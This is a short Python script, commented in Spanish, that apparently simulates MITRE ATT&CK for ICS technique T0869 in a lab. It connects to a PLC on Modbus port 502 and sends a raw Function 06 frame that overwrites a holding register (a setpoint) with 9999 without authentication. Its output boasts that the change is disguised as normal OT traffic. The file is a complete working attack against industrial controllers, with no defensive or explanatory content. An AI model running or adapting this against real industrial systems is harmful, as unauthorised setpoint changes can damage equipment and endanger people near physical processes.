import socket
import time

IP_PLC = '192.168.70.129'
PORT_ICS = 502

print("[*] Simulando Técnica T0869 - Standard Application Layer Protocol")
print("[-] El atacante utiliza el protocolo legítimo sin autenticación para alterar un setpoint...")

try:
    # 1. Establecimiento de conexión TCP pura
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_PLC, PORT_ICS))
    
    # 2. Inyección de comando estándar (Modbus FC 06)
    # TransID:0001, ProtID:0000, Len:0006, UID:01, Func:06 (Write Single Register)
    # Escribimos en el Registro 00 01 el valor hexadecimal 27 0F (que en decimal es 9999)
    payload_modbus = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x01\x27\x0F'
    
    s.send(payload_modbus)
    respuesta = s.recv(1024)
    
    print(f"[+] Modificación exitosa. El PLC obedece el comando estándar. Respuesta: {respuesta.hex()}")
    
    # 3. Cierre limpio
    s.close()
    print("[*] Conexión cerrada. El ataque se ha camuflado como tráfico OT normal.")

except Exception as e:
    print(f"[!] Error de conexión: {e}")
